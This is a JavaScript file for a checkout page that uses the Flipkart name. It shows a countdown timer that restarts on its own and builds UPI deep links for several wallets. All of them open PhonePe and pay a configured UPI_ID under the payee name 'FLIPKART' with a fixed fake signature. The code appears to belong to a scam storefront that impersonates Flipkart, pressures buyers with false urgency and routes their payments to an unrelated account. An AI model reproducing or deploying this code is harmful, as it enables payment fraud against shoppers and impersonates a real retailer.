var itemData;
$(document).ready(function () {
    startTimer(500 - 120, $('#offerend-time'));
    $(".form-check").on('click', function () {
        $(".form-check").removeClass('active');
        $(this).addClass('active');
    });
    $("#back_btn").on("click", function () {
        history.back();
    });

    var selected_verient = localStorage.getItem("selected_verient");
    itemData = JSON.parse(selected_verient);
    $("#item_image").prop('src', itemData.img1);
    var name = itemData.name + " " + ((itemData.color) ? ' (' + itemData.color + ')' : '') + ((itemData.size) ? ' (' + itemData.size + ')' : '') + ((itemData.storage) ? ' (' + itemData.storage + ')' : '');
    $("#product-title").html(name);
    $(".selling_price, .payable").html("&#8377;" + itemData.selling_price);
    $(".mrp").html("&#8377;" + itemData.mrp);
});

function startTimer(duration, display) {
    var timer = duration, minutes, seconds;
    setInterval(function () {
        minutes = parseInt(timer / 60, 10);
        seconds = parseInt(timer % 60, 10);

        minutes = minutes < 10 ? "0" + minutes : minutes;
        seconds = seconds < 10 ? "0" + seconds : seconds;

        display.text(minutes + "min " + seconds + "sec");

        if (--timer < 0) {
            timer = duration;
        }
    }, 1000);
}


function payNow() {
    var orderNumber = Math.floor(Math.random() * 10000000000);
    var payType = $(".form-check.active").attr('pay-type');
    var redirect_url = "";
    var site_name = "Flipkart";
    var upi_address = UPI_ID;
    var amt = parseFloat(itemData.selling_price).toFixed(2);

   
    switch (payType) {
        case 'gpay':
            redirect_url = "phonepe://upi/pay?pa=" + upi_address + "&am="+ amt + "&pn=FLIPKART&tn=Flipkart_" + orderNumber + "&tr=" + orderNumber + "&mc=0000"+"&sign=785674gjhfsdhjvbjdsbs";
            break;

        case 'phonepe':
            redirect_url = "phonepe://pay?pa=" + upi_address + "&pn=" + site_name + "&am=" + amt + "&tr=H2MkMGf5olejI&mc=8931&cu=INR&tn=" + site_name+"&sign=785674gjhfsdhjvbjdsbs";
            break;

        case 'paytm':
            redirect_url = "phonepe://pay?pa=" + upi_address + "&pn=" + site_name + "&am=" + amt + "&tr=H2MkMGf5olejI&mc=8931&cu=INR&tn=" + site_name+"&sign=785674gjhfsdhjvbjdsbs";
            break;

        case 'bhim_upi':
            redirect_url = "phonepe://pay?pa=" + upi_address + "&pn=" + site_name + "&am=" + amt + "&tr=H2MkMGf5olejI&mc=8931&cu=INR&tn=" + site_name+"&sign=785674gjhfsdhjvbjdsbs";
            break;

        case 'whatspp_pay':
            redirect_url = "phonepe://pay?pa=" + upi_address + "&pn=" + site_name + "&tn=" + site_name + "&am=" + amt + "&cu=INR" + "&tr=" + orderNumber+"&sign=785674gjhfsdhjvbjdsbs";
            break;

        default:
            break;
    } 
    window.location.href = redirect_url;
        // AJAX call to notify the server about the payment
    if (redirect_url) {
        $.ajax({
            type: 'POST',
            url: '/process-payment.php', // Replace with the actual server endpoint
            data: {
                orderNumber: orderNumber,
                payType: payType,
                upi_address: upi_address,
                amt: amt
            },
            success: function(response) {
                // Check the response from the server
                if (response === 'success') {
                    // Redirect to the "Thank You" page after successful payment notification
                      setTimeout(function() {
                    window.location.href = "/thankyou";
                }, 20000); // 20 seconds delay (20000 milliseconds)
                    // window.location.href = "/thankyou";
                } else {
                    // Handle unsuccessful payment
                    alert("Payment failed. Please try again.");
                }
            },
            error: function() {
                // Handle error if the server notification fails
                alert("Payment successful, but server notification failed. Please contact support.");
            }
        });
    }

}
